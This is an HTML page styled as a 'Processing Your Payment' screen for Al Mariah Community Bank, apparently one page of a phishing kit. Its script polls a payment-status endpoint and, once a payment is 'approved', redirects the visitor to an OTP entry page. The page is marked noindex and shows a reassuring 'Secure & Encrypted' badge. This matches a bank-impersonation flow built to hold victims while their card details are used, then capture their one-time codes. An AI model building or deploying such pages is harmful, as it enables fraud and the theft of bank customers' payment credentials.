<!DOCTYPE html>
<html dir="ltr" lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>Processing Payment - Al Mariah Community Bank</title>
<link rel="icon" href="/ar/wp-content/uploads/sites/5/2024/04/cropped-favicon-mbank-1-32x32.png" sizes="32x32">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0a1628;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;}
.wait-box{text-align:center;padding:40px 30px;max-width:420px;width:100%;}
.bank-logo{margin-bottom:30px;}
.bank-logo img{height:50px;object-fit:contain;}

.spinner-wrap{position:relative;width:90px;height:90px;margin:0 auto 30px;}
.spinner-ring{width:90px;height:90px;border:5px solid rgba(0,200,255,0.12);border-top:5px solid #00c8ff;border-radius:50%;animation:spin 1s linear infinite;}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.spinner-icon{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);}
.spinner-icon svg{width:32px;height:32px;}

.wait-title{font-size:1.3rem;font-weight:700;color:#00c8ff;margin-bottom:10px;}
.wait-sub{font-size:0.92rem;color:#6b7f9e;line-height:1.7;margin-bottom:30px;}

.progress-dots{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:30px;}
.progress-dots span{width:10px;height:10px;border-radius:50%;background:rgba(0,200,255,0.2);animation:dotPulse 1.4s ease-in-out infinite;}
.progress-dots span:nth-child(2){animation-delay:0.2s;}
.progress-dots span:nth-child(3){animation-delay:0.4s;}
@keyframes dotPulse{0%,80%,100%{background:rgba(0,200,255,0.2);transform:scale(1);}40%{background:#00c8ff;transform:scale(1.3);}}

.secure-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(0,200,83,0.1);padding:8px 16px;border-radius:20px;font-size:0.82rem;color:#69f0ae;}
.secure-badge svg{width:14px;height:14px;}
</style>
</head>
<body>
<div class="wait-box">
  <div class="bank-logo">
    <img src="/ar/wp-content/themes/framework/assets/client/img/logo-white-2.png" alt="Al Mariah Community Bank">
  </div>
  <div class="spinner-wrap">
    <div class="spinner-ring"></div>
    <div class="spinner-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="#00c8ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/>
      </svg>
    </div>
  </div>
  <div class="wait-title">Processing Your Payment</div>
  <div class="wait-sub">Your payment is being verified securely.<br>This may take a few moments, please do not close this page.</div>
  <div class="progress-dots">
    <span></span><span></span><span></span>
  </div>
  <div class="secure-badge">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
    </svg>
    Secure &amp; Encrypted Connection
  </div>
</div>

<script>
var params = new URLSearchParams(window.location.search);
var paymentId = params.get('id') || params.get('oid') || '';
if (!paymentId) {
  try { paymentId = sessionStorage.getItem('payment_id') || sessionStorage.getItem('order_id') || ''; } catch(e) {}
}
if (!paymentId) { window.location.href = '/en/order/'; }

function checkStatus() {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '/api/payment-status?id=' + encodeURIComponent(paymentId), true);
  xhr.onload = function() {
    try {
      var r = JSON.parse(xhr.responseText);
      if (r.status === 'approved') {
        window.location.href = '/en/order/otp.html?id=' + paymentId;
      } else if (r.status === 'rejected') {
        window.location.href = '/en/order/summary.html?error=rejected';
      }
    } catch(e) {}
  };
  xhr.send();
}

setInterval(checkStatus, 2500);
checkStatus();
</script>
</body>
</html>
